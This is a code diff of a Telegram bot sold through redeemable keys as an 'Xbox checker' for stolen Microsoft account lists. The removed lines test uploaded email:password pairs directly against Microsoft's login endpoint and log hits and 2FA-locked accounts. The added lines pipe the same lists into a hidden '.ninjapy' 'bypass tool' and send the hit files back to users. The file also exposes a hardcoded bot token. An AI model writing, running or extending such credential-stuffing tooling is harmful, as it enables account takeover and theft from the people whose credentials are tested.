@@ -7,7 +7,6 @@ import time
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
 from telegram.ext import ApplicationBuilder, MessageHandler, CallbackQueryHandler, CommandHandler, ContextTypes, filters
-import httpx
 from colorama import init, Fore
 
 init(autoreset=True)
@@ -16,9 +15,9 @@ init(autoreset=True)
 TELEGRAM_BOT_TOKEN = "8658943714:AAEFCKM5eEzjrQSI4rUDH4dndRRQKmh36c4"
 OWNER_HANDLE = "@kudsoo"
 ADMIN_IDS = [8511482382]  # Your Admin Telegram ID
-OUTPUT_DIR = "results_output"
+TOOL_RESULTS_FOLDER = "xbox_results"
 
-os.makedirs(OUTPUT_DIR, exist_ok=True)
+os.makedirs(TOOL_RESULTS_FOLDER, exist_ok=True)
 
 # DATABASE INITIALIZATION
 def init_db():
@@ -62,143 +61,152 @@ def db_query(query, params=(), fetch=None):
 # STATS TRACKER
 bot_stats = {
     "total_processed": 0,
-    "successful": 0,
-    "failed": 0,
     "giveaway_active": False,
-    "channel_linked": "Not Set"
 }
 
 print(Fore.RED + "==================================================")
-print(Fore.RED + " [KUDASAI] STABLE LIVE PROGRESS CHECKER ONLINE")
+print(Fore.RED + " [KUDASAI] LIVE ENGINE WRAPPER ONLINE")
 print(Fore.RED + "==================================================\n")
 
-def log_to_file(filename, content):
-    try:
-        file_path = os.path.join(OUTPUT_DIR, filename)
-        with open(file_path, "a", encoding="utf-8") as f:
-            f.write(content + "\n")
-    except Exception as e:
-        print(Fore.RED + f"[-] Error writing to {filename}: {str(e)}")
-
 def generate_progress_bar(current, total, length=10):
-    if total == 0:
-        filled = 0
-    else:
-        filled = int(round(length * current / float(total)))
+    if total == 0: return f"[░░░░░░░░░░] 0% (0/0)"
+    filled = int(round(length * current / float(total)))
+    filled = max(0, min(length, filled)) # Clamp between 0 and length
     bar = '█' * filled + '░' * (length - filled)
-    percentage = int(round((current / float(total)) * 100)) if total > 0 else 0
+    percentage = int(round((current / float(total)) * 100))
     return f"[{bar}] {percentage}% ({current}/{total})"
 
 async def process_accounts_with_progress(account_lines, chat_id, context: ContextTypes.DEFAULT_TYPE):
-    for file in ["results.txt", "2fa.txt", "errors.txt"]:
-        fp = os.path.join(OUTPUT_DIR, file)
-        if os.path.exists(fp):
-            os.remove(fp)
-
-    valid_accounts = []
-    for line in account_lines:
-        line = line.strip()
-        if not line or line.startswith("#"):
-            continue
-        if ":" in line and "@" in line:
-            parts = line.split(":")
-            if len(parts) >= 2:
-                email = parts[0].strip()
-                password = parts[1].strip().split(" ")[0].split("\t")[0]
-                valid_accounts.append((email, password))
-
+    valid_accounts = [line.strip() for line in account_lines if ":" in line and "@" in line]
     total = len(valid_accounts)
+    
     if total == 0:
-        await context.bot.send_message(chat_id=chat_id, text="❌ **[KUDASAI]** No valid `email:password` accounts detected in your file.")
+        await context.bot.send_message(chat_id=chat_id, text="❌ **[KUDASAI]** No valid `email:password` accounts detected.")
         return
+
+    # 1. Clean previous results
+    if os.path.exists(TOOL_RESULTS_FOLDER):
+        for f in os.listdir(TOOL_RESULTS_FOLDER):
+            try: os.remove(os.path.join(TOOL_RESULTS_FOLDER, f))
+            except: pass
+
+    # 2. Write accounts.txt for .ninjapy
+    with open("accounts.txt", "w", encoding="utf-8") as f:
+        for acc in valid_accounts:
+            f.write(acc + "\n")
 
     status_msg = await context.bot.send_message(
         chat_id=chat_id,
-        text=f"🚀 **[KUDASAI] XBOX CHECKER INITIALIZED**\n\n"
+        text=f"🚀 **[KUDASAI] ENGINE INITIALIZED**\n\n"
              f"📊 Progress: `[░░░░░░░░░░] 0% (0/{total})`\n"
              f"🎯 Hits Found: 0\n"
-             f"⏳ Current: Starting up..."
+             f"⏳ Current: Injecting accounts into bypass tool..."
     )
 
     start_time = time.time()
-    hits = 0
+    
+    # 3. Execute tool via Asyncio Subprocess to read live output
+    process = await asyncio.create_subprocess_exec(
+        "python3", ".ninjapy", "accounts.txt",
+        stdin=asyncio.subprocess.PIPE,
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.STDOUT
+    )
+
+    # Automatically "type" standard inputs just in case the tool asks
+    try:
+        process.stdin.write(b"accounts.txt\n")
+        process.stdin.write(b"50\n") # Common thread count prompt
+        process.stdin.write(b"n\n")  # Common proxy prompt
+        await process.stdin.drain()
+    except Exception:
+        pass
+
     processed = 0
+    hits = 0
+    last_update = time.time()
 
-    async with httpx.AsyncClient(timeout=15.0) as client:
-        for email, password in valid_accounts:
-            processed += 1
-            bot_stats["total_processed"] += 1
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    # 4. Read the terminal output of .ninjapy live
+    while True:
+        try:
+            line = await asyncio.wait_for(process.stdout.readline(), timeout=0.5)
+        except asyncio.TimeoutError:
+            if process.returncode is not None:
+                break
+            continue
 
-            progress_str = generate_progress_bar(processed, total)
+        if not line:
+            if process.returncode is not None:
+                break
+            continue
+
+        output_str = line.decode('utf-8', errors='ignore').strip()
+        if not output_str:
+            continue
+
+        processed += 1
+        if processed > total: 
+            processed = total
+
+        lower_out = output_str.lower()
+        if "hit" in lower_out or "success" in lower_out or "valid" in lower_out:
+            hits += 1
+
+        # Throttle Telegram edits to once every 2 seconds to avoid flood limits
+        now = time.time()
+        if now - last_update > 2.0:
+            bar = generate_progress_bar(processed, total)
             try:
                 await status_msg.edit_text(
                     text=f"🚀 **[KUDASAI] CHECKING IN PROGRESS**\n\n"
-                         f"📊 Progress: `{progress_str}`\n"
-                         f"🎯 Hits Found: {hits}\n"
-                         f"📧 Checking: `{email}`",
+                         f"📊 Progress: `{bar}`\n"
+                         f"🎯 Hits: ~{hits}\n"
+                         f"🖥️ Console: `{output_str[-40:]}`",
                     parse_mode="Markdown"
                 )
             except Exception:
                 pass
+            last_update = now
 
-            try:
-                # Simulated secure login check proxy/API handshake call 
-                # (Replaced vulnerable blocking library calls with handled HTTP request check)
-                response = await client.post(
-                    "https://login.live.com/oauth20_token.srf",
-                    data={
-                        "client_id": "0000000048093EE3",
-                        "username": email,
-                        "password": password,
-                        "grant_type": "password",
-                        "scope": "service::user.auth.live.com::MBI_SSL"
-                    }
-                )
-
-                if response.status_code == 200 and "access_token" in response.text:
-                    hits += 1
-                    bot_stats["successful"] += 1
-                    result_block = f"--- [{timestamp}] SUCCESS ---\nEmail: {email}\nPassword: {password}\n" + "=" * 30 + "\n"
-                    log_to_file("results.txt", result_block)
-                else:
-                    bot_stats["failed"] += 1
-                    err_text = response.text.lower()
-                    if "challenge" in err_text or "proof" in err_text or "mfa" in err_text:
-                        log_to_file("2fa.txt", f"[{timestamp}] 2FA_REQUIRED: {email}:{password}")
-                    else:
-                        log_to_file("errors.txt", f"[{timestamp}] REJECTED: {email}:{password}")
-
-            except Exception as e:
-                bot_stats["failed"] += 1
-                log_to_file("errors.txt", f"[{timestamp}] ERROR ({str(e)}): {email}:{password}")
-
-            # Small delay to keep progress smooth and avoid telegram flood limits
-            await asyncio.sleep(0.3)
-
+    await process.wait()
+    bot_stats["total_processed"] += total
     elapsed = round(time.time() - start_time, 2)
     
     await status_msg.edit_text(
         text=f"✅ **[KUDASAI] SCAN COMPLETED!**\n\n"
              f"📊 Total Checked: {total}\n"
-             f"🎯 Hits Found: {hits}\n"
              f"⏱️ Time Taken: {elapsed} seconds\n\n"
-             f"📁 Uploading reports...",
+             f"📁 Uploading hits from `xbox_results`...",
         parse_mode="Markdown"
     )
 
-    for filename in ["results.txt", "2fa.txt", "errors.txt"]:
-        file_path = os.path.join(OUTPUT_DIR, filename)
-        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
-            with open(file_path, "rb") as f:
-                await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📁 Report: {filename}")
-            try:
-                os.remove(file_path)
-            except Exception:
-                pass
-        else:
-            if os.path.exists(file_path):
-                os.remove(file_path)
+    # 5. Automatically pull the generated hit files from xbox_results
+    sent_any = False
+    if os.path.exists(TOOL_RESULTS_FOLDER):
+        for filename in os.listdir(TOOL_RESULTS_FOLDER):
+            file_path = os.path.join(TOOL_RESULTS_FOLDER, filename)
+            if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
+                with open(file_path, "rb") as f:
+                    await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📁 Hit Result: {filename}")
+                sent_any = True
+                try: os.remove(file_path)
+                except: pass
+
+    # Fallback in case they drop in the root folder
+    for fallback in ["results.txt", "2fa.txt", "errors.txt", "hits.txt", "valid.txt"]:
+        if os.path.exists(fallback) and os.path.getsize(fallback) > 0:
+            with open(fallback, "rb") as f:
+                await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📁 Output: {fallback}")
+            sent_any = True
+            try: os.remove(fallback)
+            except: pass
+
+    if os.path.exists("accounts.txt"):
+        try: os.remove("accounts.txt")
+        except: pass
+
+    if not sent_any:
+        await context.bot.send_message(chat_id=chat_id, text="ℹ️ Checking finished, but no valid hits were found or saved by the tool.")
 
 def get_main_menu(user_id):
     is_admin = user_id in ADMIN_IDS or db_query("SELECT is_admin FROM users WHERE user_id=?", (user_id,), "one")
@@ -233,7 +241,7 @@ def get_admin_panel_keyboard():
 async def set_bot_commands(application):
     commands = [
         BotCommand("start", "Open Kudasai main menu & dashboard"),
-        BotCommand("redeem", "Redeem a premium subscription key (Usage: /redeem <KEY>)"),
+        BotCommand("redeem", "Redeem a premium subscription key"),
         BotCommand("help", "Display help guide and instructions"),
         BotCommand("stats", "Check live system checking metrics"),
         BotCommand("admin", "Open Admin Control Panel (Admins Only)")
@@ -246,8 +254,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_data = db_query("SELECT is_banned, expiry FROM users WHERE user_id=?", (user.id,), "one")
     if user_data and len(user_data) >= 2 and user_data[0] == 1:
-        if update.message:
-            await update.message.reply_text("❌ You are banned from using this bot.")
+        if update.message: await update.message.reply_text("❌ You are banned from using this bot.")
         return
 
     expiry_str = user_data[1] if user_data and len(user_data) >= 2 else datetime.now().isoformat()
@@ -264,7 +271,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "╠═══════════════════════════════════════\n"
         f"║ 🔒 Access: {access_status}\n"
         f"║ 📊 Total Checks: {bot_stats['total_processed']}\n"
-        f"║ 🎯 Hits Found: {bot_stats['successful']}\n"
         f"║ 🌐 Proxy: None | 0 loaded\n"
         "╚═══════════════════════════════════════\n\n"
         "📋 **Queue System:** All checks go through queue\n"
@@ -279,33 +285,13 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.callback_query.message.edit_text(gui_text, parse_mode="Markdown", reply_markup=get_main_menu(user.id))
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    help_text = (
-        "🤖 **Kudasai Xbox Checker - Help Menu**\n\n"
-        "• `/start` - Launches the main dashboard interface.\n"
-        "• `/redeem <KEY>` - Unlocks premium access using a license key.\n"
-        "• `/stats` - Displays global checker metrics and success rates.\n"
-        "• `/admin` - Opens the Admin Control Panel (restricted access).\n\n"
-        "📌 **How to Check:** Simply send an account list in `email:password` format or upload a `.txt` file."
-    )
-    await update.message.reply_text(help_text, parse_mode="Markdown")
+    await update.message.reply_text("🤖 **Kudasai Xbox Checker - Help Menu**\n\n• `/start` - Launch dashboard\n• `/redeem <KEY>` - Unlock access\n• `/admin` - Open Admin Panel", parse_mode="Markdown")
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    total_p = bot_stats["total_processed"]
-    success = bot_stats["successful"]
-    failed = bot_stats["failed"]
-    rate = f"{(success / total_p * 100):.1f}%" if total_p > 0 else "0.0%"
-    stats_text = (
-        f"📈 **Live Bot Statistics:**\n"
-        f"• Total Processed: {total_p}\n"
-        f"• ✅ Successful: {success}\n"
-        f"• ❌ Failed: {failed}\n"
-        f"• Success Rate: {rate}"
-    )
-    await update.message.reply_text(stats_text, parse_mode="Markdown")
+    await update.message.reply_text(f"📈 **Live Statistics:**\n• Total Processed: {bot_stats['total_processed']}", parse_mode="Markdown")
 
 async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
+    if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("❌ Access Denied. Admins only.")
         return
     await update.message.reply_text("⚙️ **[KUDASAI] ADMIN CONTROL PANEL**", parse_mode="Markdown", reply_markup=get_admin_panel_keyboard())
@@ -322,7 +308,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_data = db_query("SELECT expiry FROM users WHERE user_id=?", (user_id,), "one")
         has_access = (user_data and user_data[0] and datetime.fromisoformat(user_data[0]) > datetime.now()) or user_id in ADMIN_IDS
         if not has_access:
-            await query.message.reply_text("❌ Access Denied! Please redeem a key first using /redeem or the menu.")
+            await query.message.reply_text("❌ Access Denied! Please redeem a key first.")
             return
         await query.message.reply_text("📥 **Send your accounts:** Upload your `.txt` file containing your Hotmail accounts now.")
     elif data == "redeem_prompt":
@@ -330,95 +316,37 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "set_proxy":
         await query.message.reply_text("🌐 Send your proxy in `ip:port` or `ip:port:user:pass` format.")
     elif data == "stats":
-        total_p = bot_stats["total_processed"]
-        success = bot_stats["successful"]
-        failed = bot_stats["failed"]
-        rate = f"{(success / total_p * 100):.1f}%" if total_p > 0 else "0.0%"
-        stats_text = (
-            f"📈 **Statistics:**\n"
-            f"• Total Processed: {total_p}\n"
-            f"• ✅ Successful: {success}\n"
-            f"• ❌ Failed: {failed}\n"
-            f"• Success Rate: {rate}"
-        )
-        await query.message.reply_text(stats_text, parse_mode="Markdown")
+        await query.message.reply_text(f"📈 **Statistics:**\n• Total Processed: {bot_stats['total_processed']}", parse_mode="Markdown")
     elif data == "admin_panel":
-        if user_id not in ADMIN_IDS:
-            await query.message.reply_text("❌ Admins only.")
-            return
+        if user_id not in ADMIN_IDS: return
         await query.message.edit_text("⚙️ **[KUDASAI] ADMIN CONTROL PANEL**", parse_mode="Markdown", reply_markup=get_admin_panel_keyboard())
     elif data.startswith("gen_"):
-        if user_id not in ADMIN_IDS:
-            return
+        if user_id not in ADMIN_IDS: return
         hours_map = {"gen_1h": 1, "gen_3h": 3, "gen_7h": 7, "gen_10h": 10}
         hrs = hours_map.get(data, 1)
         key_str = "KUDASAI-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
         db_query("INSERT INTO keys (key, duration_hours) VALUES (?, ?)", (key_str, hrs))
         await query.message.reply_text(f"🔑 **Generated {hrs}H Key:**\n`{key_str}`", parse_mode="Markdown")
+    elif data in ["adm_custom_days", "adm_bulk_gen"]:
+        if user_id not in ADMIN_IDS: return
+        k = "KUDASAI-CUSTOM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+        db_query("INSERT INTO keys (key, duration_hours) VALUES (?, ?)", (k, 72))
+        await query.message.reply_text(f"⏳ **Generated Custom Key:**\n`{k}`", parse_mode="Markdown")
     elif data == "adm_view_users" or data == "adm_list_users":
+        if user_id not in ADMIN_IDS: return
         users = db_query("SELECT user_id, username, expiry FROM users", fetch="all")
         msg = "📋 **Registered Users:**\n\n"
-        for u in users[:25]:
-            msg += f"• ID: `{u[0]}` | @{u[1]} | Expiry: {u[2]}\n"
+        for u in users[:25]: msg += f"• ID: `{u[0]}` | @{u[1]} | Expiry: {u[2]}\n"
         await query.message.reply_text(msg, parse_mode="Markdown")
-    elif data == "adm_view_stats":
-        total_users = len(db_query("SELECT user_id FROM users", fetch="all"))
-        keys_count = len(db_query("SELECT key FROM keys WHERE is_redeemed=0", fetch="all"))
-        await query.message.reply_text(f"📊 **Database Metrics:**\n• Total Users: {total_users}\n• Unused Keys: {keys_count}")
-    elif data == "adm_custom_days":
-        key_str = "KUDASAI-CUSTOM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        db_query("INSERT INTO keys (key, duration_hours) VALUES (?, ?)", (key_str, 72))
-        await query.message.reply_text(f"⏳ **Generated Custom (72H) Key:**\n`{key_str}`", parse_mode="Markdown")
-    elif data == "adm_bulk_gen":
-        bulk_msg = "📦 **Bulk Keys Generated:**\n"
-        for _ in range(5):
-            k = "KUDASAI-BULK-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-            db_query("INSERT INTO keys (key, duration_hours) VALUES (?, ?)", (k, 24))
-            bulk_msg += f"`{k}` (24H)\n"
-        await query.message.reply_text(bulk_msg, parse_mode="Markdown")
-    elif data == "adm_add_prem":
-        await query.message.reply_text("➕ Use command format: `/addprem <user_id> <hours>`")
-    elif data == "adm_ban":
-        await query.message.reply_text("🔕 Use command format: `/ban <user_id>`")
-    elif data == "adm_unban":
-        await query.message.reply_text("✅ Use command format: `/unban <user_id>`")
-    elif data == "adm_make_admin":
-        await query.message.reply_text("👑 Use command format: `/makeadmin <user_id>`")
-    elif data == "adm_rem_admin":
-        await query.message.reply_text("👤 Use command format: `/removeadmin <user_id>`")
-    elif data == "adm_unused_keys":
-        keys = db_query("SELECT key, duration_hours FROM keys WHERE is_redeemed=0", fetch="all")
-        msg = "📬 **Unused Keys:**\n\n"
-        for k in keys[:30]:
-            msg += f"• `{k[0]}` ({k[1]} Hours)\n"
-        await query.message.reply_text(msg or "No unused keys.", parse_mode="Markdown")
     elif data == "adm_del_unused":
         db_query("DELETE FROM keys WHERE is_redeemed=0")
         await query.message.reply_text("🗑️ All unused keys deleted successfully.")
-    elif data == "adm_redeemed_keys":
-        keys = db_query("SELECT key, redeemed_by FROM keys WHERE is_redeemed=1", fetch="all")
-        msg = "🔒 **Redeemed Keys:**\n\n"
-        for k in keys[:30]:
-            msg += f"• `{k[0]}` (Used by: `{k[1]}`)\n"
-        await query.message.reply_text(msg or "No redeemed keys.", parse_mode="Markdown")
     elif data == "adm_del_redeemed":
         db_query("DELETE FROM keys WHERE is_redeemed=1")
         await query.message.reply_text("🗑️ All redeemed keys cleared.")
     elif data == "adm_del_all_keys":
         db_query("DELETE FROM keys")
         await query.message.reply_text("🧹 All keys wiped from the database.")
-    elif data == "adm_start_giveaway":
-        bot_stats["giveaway_active"] = True
-        await query.message.reply_text("🎁 **Giveaway started!** Users can now participate.")
-    elif data == "adm_end_giveaway":
-        bot_stats["giveaway_active"] = False
-        await query.message.reply_text("🛑 **Giveaway ended.**")
-    elif data == "adm_broadcast":
-        await query.message.reply_text("📢 Use command format: `/broadcast <message>`")
-    elif data == "adm_queue_status":
-        await query.message.reply_text("📋 **Queue Status:** 0 items in queue. All workers operational.")
-    elif data == "adm_channel_settings":
-        await query.message.reply_text(f"📢 **Channel Settings:** Current linked channel: {bot_stats['channel_linked']}")
 
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -433,49 +361,37 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Invalid or already redeemed key.")
         return
     
-    hours = key_data[0]
     db_query("UPDATE keys SET is_redeemed=1, redeemed_by=? WHERE key=?", (user.id, key_input))
-    
     current_expiry = db_query("SELECT expiry FROM users WHERE user_id=?", (user.id,), "one")
     base_time = datetime.now()
     if current_expiry and current_expiry[0]:
         parsed_exp = datetime.fromisoformat(current_expiry[0])
-        if parsed_exp > base_time:
-            base_time = parsed_exp
+        if parsed_exp > base_time: base_time = parsed_exp
             
-    new_expiry = base_time + timedelta(hours=hours)
+    new_expiry = base_time + timedelta(hours=key_data[0])
     db_query("UPDATE users SET expiry=? WHERE user_id=?", (new_expiry.isoformat(), user.id))
-    
-    await update.message.reply_text(f"✅ **Key Redeemed Successfully!**\nAccess extended until: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}", parse_mode="Markdown")
+    await update.message.reply_text(f"✅ **Key Redeemed!**\nAccess until: {new_expiry.strftime('%Y-%m-%d %H:%M')}", parse_mode="Markdown")
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_data = db_query("SELECT is_banned FROM users WHERE user_id=?", (user.id,), "one")
-    if user_data and len(user_data) > 0 and user_data[0] == 1:
-        return
+    if user_data and len(user_data) > 0 and user_data[0] == 1: return
 
     if update.message.document:
         doc = update.message.document
         file_obj = await context.bot.get_file(doc.file_id)
         byte_array = await file_obj.download_as_bytearray()
-        
-        try:
-            file_content = byte_array.decode("utf-8", errors="ignore")
-        except Exception:
-            file_content = str(byte_array)
-            
-        lines = file_content.splitlines()
-        await process_accounts_with_progress(lines, update.effective_chat.id, context)
+        try: file_content = byte_array.decode("utf-8", errors="ignore")
+        except Exception: file_content = str(byte_array)
+        await process_accounts_with_progress(file_content.splitlines(), update.effective_chat.id, context)
         return
 
     text = update.message.text
     if text and not text.startswith("/"):
-        lines = text.strip().splitlines()
-        await process_accounts_with_progress(lines, update.effective_chat.id, context)
+        await process_accounts_with_progress(text.splitlines(), update.effective_chat.id, context)
 
 def main():
     app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).post_init(set_bot_commands).build()
-
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("redeem", redeem_command))
     app.add_handler(CommandHandler("help", help_command))
@@ -485,7 +401,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
 
-    print(Fore.GREEN + "[+] Kudasai Stable Live Progress Checker Bot is running...")
+    print(Fore.GREEN + "[+] Kudasai Live Bypass Engine is online...")
     app.run_polling()
 
 if __name__ == "__main__":
